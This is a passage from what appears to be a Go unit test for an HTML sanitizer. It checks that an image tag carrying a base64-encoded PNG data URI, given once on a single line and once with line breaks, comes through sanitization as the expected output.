	input := `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAIAAADajyQQAAAAhnpUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjadY5LCsNADEP3c4oewb+R7eOUkEBv0OPXZpKmm76FLIQRGvv7dYxHwyTDpgcSoMLSUp5lghZKxELct3RxXuVycsdDZRlkONn9aGd+MRWBw80dExs2qXbZlTVKu6hbqWfkT8l30Z/8WvEBQsUsKBcOhtYAAAoCaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1FeGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICBleGlmOlBpeGVsWERpbWVuc2lvbj0iNzIiCiAgIGV4aWY6UGl4ZWxZRGltZW5zaW9uPSI3MiIKICAgdGlmZjpJbWFnZVdpZHRoPSI3MiIKICAgdGlmZjpJbWFnZUhlaWdodD0iNzIiCiAgIHRpZmY6T3JpZW50YXRpb249IjEiLz4KIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pq6cYi8AAAADc0JJVAgICNvhT+AAAAN7SURBVGje7dtRSBNhHADwfxJ3L96Le0kf1GD1sBDyO5ALbEkyMyY9bHswg+FDW5B7EKVhJSeElrQUcRIkFFHoi0toPriEVi8KbUQxKSYNk8HpYE5ot4e7e/l68NT08aTp6v9/25+P7+O3/3d3H3ffB7RooSSH7IQQYu0KS4qeeeEWyHbY+qLZvbbZiEcghBBHIJ43NhrQ4oYiRUU7sQ0lFJqPizbBEViUFCWfnOmyCp4ZaV/bfHLKIwiecLYUYJTSbLid2ALJX/E+q7VnUdGz0pSDOKakA39DQrQSd8RI0cqgCLEe8rZ55zb1X5oKwLAMywJoANpOI4ZhAEBdHnA6B5ZVPalqwHCckTGLAqvi69jPwZF36yrIK6GR4NrZjrbTbK2ziVsaeba0CaD+nAtOrtU6m6rY2qbazYWH08syqOtLwUcfoamjzpCsSPNPigy5bYQQIti7xuP6VaOshsV26052Uc/mE1M9DoEQQmxuMbyqGBvwBKUU/sUog380EIYwhCEMYQhD2DGMk4VCASuGMIQhDGEIQ9hxe0Af5eDyj7ejw5PRVAGgwnLNJ/qaK+HTnRZ/bF8rc9/s86umEoKpXyb8E+nWx7NP65nM+9HuB/5T5tc3zouzs/q7Ri0d6vdHLb5GU2lNxa0txuLq6aw3scDVNHZcrsjE0jKwnEmPQnQiVLg26KvnSmwqVjb3DjXvVC8djRVOtVbvGTbmh19utY55z7Cle/NQN94/8IcYl+iq2U19m55Mmb2d51ijnR45TP7yrPvmaME1NnZrrzjy1+mo1tBp6OI6DndF2Ji/f3s03Si+6r34p0FNRb5q50ULd4iuj7Bi8reR7uFUgzjYYYFcLpfL5WT9I0sm9l2rbjQfxnWEFcvFJsIZgEi/O3LgiaVmUluMubr8UN2fkGUZl1QIQxjCEIYwhCEMYYdbUuE+D4QhDGEIQxjC/luYvBK667zE8zx/oc0XXNK3B8vL0716tsX75IOe3fzwxNtyged5vuX6QGhFNThkUfakJ0Sb4H6RyFOqrIZ7rIInmqdUSQbsxDEez+5mI3lKpRm3YOuLSAql2fi4g9gDSUObZ4vy+o2tu/dmATiOBZA1UIEzcQDAMiaO+aPV9nbtKtfkwhWW4wBUWVOh3FTFsce2YnhSAk9K4EmJvxt4UgJPSuCSCmEIQxjCEAYAAL8BrebxGP8KiJcAAAAASUVORK5CYII=" alt="">`
	out := p.Sanitize(input)
	expected := `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAIAAADajyQQAAAAhnpUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjadY5LCsNADEP3c4oewb+R7eOUkEBv0OPXZpKmm76FLIQRGvv7dYxHwyTDpgcSoMLSUp5lghZKxELct3RxXuVycsdDZRlkONn9aGd+MRWBw80dExs2qXbZlTVKu6hbqWfkT8l30Z/8WvEBQsUsKBcOhtYAAAoCaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1FeGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICBleGlmOlBpeGVsWERpbWVuc2lvbj0iNzIiCiAgIGV4aWY6UGl4ZWxZRGltZW5zaW9uPSI3MiIKICAgdGlmZjpJbWFnZVdpZHRoPSI3MiIKICAgdGlmZjpJbWFnZUhlaWdodD0iNzIiCiAgIHRpZmY6T3JpZW50YXRpb249IjEiLz4KIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pq6cYi8AAAADc0JJVAgICNvhT+AAAAN7SURBVGje7dtRSBNhHADwfxJ3L96Le0kf1GD1sBDyO5ALbEkyMyY9bHswg+FDW5B7EKVhJSeElrQUcRIkFFHoi0toPriEVi8KbUQxKSYNk8HpYE5ot4e7e/l68NT08aTp6v9/25+P7+O3/3d3H3ffB7RooSSH7IQQYu0KS4qeeeEWyHbY+qLZvbbZiEcghBBHIJ43NhrQ4oYiRUU7sQ0lFJqPizbBEViUFCWfnOmyCp4ZaV/bfHLKIwiecLYUYJTSbLid2ALJX/E+q7VnUdGz0pSDOKakA39DQrQSd8RI0cqgCLEe8rZ55zb1X5oKwLAMywJoANpOI4ZhAEBdHnA6B5ZVPalqwHCckTGLAqvi69jPwZF36yrIK6GR4NrZjrbTbK2ziVsaeba0CaD+nAtOrtU6m6rY2qbazYWH08syqOtLwUcfoamjzpCsSPNPigy5bYQQIti7xuP6VaOshsV26052Uc/mE1M9DoEQQmxuMbyqGBvwBKUU/sUog380EIYwhCEMYQhD2DGMk4VCASuGMIQhDGEIQ9hxe0Af5eDyj7ejw5PRVAGgwnLNJ/qaK+HTnRZ/bF8rc9/s86umEoKpXyb8E+nWx7NP65nM+9HuB/5T5tc3zouzs/q7Ri0d6vdHLb5GU2lNxa0txuLq6aw3scDVNHZcrsjE0jKwnEmPQnQiVLg26KvnSmwqVjb3DjXvVC8djRVOtVbvGTbmh19utY55z7Cle/NQN94/8IcYl+iq2U19m55Mmb2d51ijnR45TP7yrPvmaME1NnZrrzjy1+mo1tBp6OI6DndF2Ji/f3s03Si+6r34p0FNRb5q50ULd4iuj7Bi8reR7uFUgzjYYYFcLpfL5WT9I0sm9l2rbjQfxnWEFcvFJsIZgEi/O3LgiaVmUluMubr8UN2fkGUZl1QIQxjCEIYwhCEMYYdbUuE+D4QhDGEIQxjC/luYvBK667zE8zx/oc0XXNK3B8vL0716tsX75IOe3fzwxNtyged5vuX6QGhFNThkUfakJ0Sb4H6RyFOqrIZ7rIInmqdUSQbsxDEez+5mI3lKpRm3YOuLSAql2fi4g9gDSUObZ4vy+o2tu/dmATiOBZA1UIEzcQDAMiaO+aPV9nbtKtfkwhWW4wBUWVOh3FTFsce2YnhSAk9K4EmJvxt4UgJPSuCSCmEIQxjCEAYAAL8BrebxGP8KiJcAAAAASUVORK5CYII=" alt="">`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}

	input = `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAIAAADajyQQAAAAhnpUWHRSYXcgcHJvZmlsZSB0
eXBlIGV4aWYAAHjadY5LCsNADEP3c4oewb+R7eOUkEBv0OPXZpKmm76FLIQRGvv7dYxHwyTD
pgcSoMLSUp5lghZKxELct3RxXuVycsdDZRlkONn9aGd+MRWBw80dExs2qXbZlTVKu6hbqWfk
T8l30Z/8WvEBQsUsKBcOhtYAAAoCaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNr
ZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBt
ZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1F
eGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIv
MjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAg
ICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyIKICAgIHhtbG5z
OnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICBleGlmOlBpeGVsWERp
bWVuc2lvbj0iNzIiCiAgIGV4aWY6UGl4ZWxZRGltZW5zaW9uPSI3MiIKICAgdGlmZjpJbWFn
ZVdpZHRoPSI3MiIKICAgdGlmZjpJbWFnZUhlaWdodD0iNzIiCiAgIHRpZmY6T3JpZW50YXRp
b249IjEiLz4KIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pq6cYi8A
AAADc0JJVAgICNvhT+AAAAN7SURBVGje7dtRSBNhHADwfxJ3L96Le0kf1GD1sBDyO5ALbEky
MyY9bHswg+FDW5B7EKVhJSeElrQUcRIkFFHoi0toPriEVi8KbUQxKSYNk8HpYE5ot4e7e/l6
8NT08aTp6v9/25+P7+O3/3d3H3ffB7RooSSH7IQQYu0KS4qeeeEWyHbY+qLZvbbZiEcghBBH
IJ43NhrQ4oYiRUU7sQ0lFJqPizbBEViUFCWfnOmyCp4ZaV/bfHLKIwiecLYUYJTSbLid2ALJ
X/E+q7VnUdGz0pSDOKakA39DQrQSd8RI0cqgCLEe8rZ55zb1X5oKwLAMywJoANpOI4ZhAEBd
HnA6B5ZVPalqwHCckTGLAqvi69jPwZF36yrIK6GR4NrZjrbTbK2ziVsaeba0CaD+nAtOrtU6
m6rY2qbazYWH08syqOtLwUcfoamjzpCsSPNPigy5bYQQIti7xuP6VaOshsV26052Uc/mE1M9
DoEQQmxuMbyqGBvwBKUU/sUog380EIYwhCEMYQhD2DGMk4VCASuGMIQhDGEIQ9hxe0Af5eDy
j7ejw5PRVAGgwnLNJ/qaK+HTnRZ/bF8rc9/s86umEoKpXyb8E+nWx7NP65nM+9HuB/5T5tc3
zouzs/q7Ri0d6vdHLb5GU2lNxa0txuLq6aw3scDVNHZcrsjE0jKwnEmPQnQiVLg26KvnSmwq
Vjb3DjXvVC8djRVOtVbvGTbmh19utY55z7Cle/NQN94/8IcYl+iq2U19m55Mmb2d51ijnR45
TP7yrPvmaME1NnZrrzjy1+mo1tBp6OI6DndF2Ji/f3s03Si+6r34p0FNRb5q50ULd4iuj7Bi
8reR7uFUgzjYYYFcLpfL5WT9I0sm9l2rbjQfxnWEFcvFJsIZgEi/O3LgiaVmUluMubr8UN2f
kGUZl1QIQxjCEIYwhCEMYYdbUuE+D4QhDGEIQxjC/luYvBK667zE8zx/oc0XXNK3B8vL0716
tsX75IOe3fzwxNtyged5vuX6QGhFNThkUfakJ0Sb4H6RyFOqrIZ7rIInmqdUSQbsxDEez+5m
I3lKpRm3YOuLSAql2fi4g9gDSUObZ4vy+o2tu/dmATiOBZA1UIEzcQDAMiaO+aPV9nbtKtfk
whWW4wBUWVOh3FTFsce2YnhSAk9K4EmJvxt4UgJPSuCSCmEIQxjCEAYAAL8BrebxGP8KiJcA
AAAASUVORK5CYII=" alt="">`
	out = p.Sanitize(input)
	expected = `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAIAAADajyQQAAAAhnpUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjadY5LCsNADEP3c4oewb+R7eOUkEBv0OPXZpKmm76FLIQRGvv7dYxHwyTDpgcSoMLSUp5lghZKxELct3RxXuVycsdDZRlkONn9aGd+MRWBw80dExs2qXbZlTVKu6hbqWfkT8l30Z/8WvEBQsUsKBcOhtYAAAoCaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1FeGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICBleGlmOlBpeGVsWERpbWVuc2lvbj0iNzIiCiAgIGV4aWY6UGl4ZWxZRGltZW5zaW9uPSI3MiIKICAgdGlmZjpJbWFnZVdpZHRoPSI3MiIKICAgdGlmZjpJbWFnZUhlaWdodD0iNzIiCiAgIHRpZmY6T3JpZW50YXRpb249IjEiLz4KIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA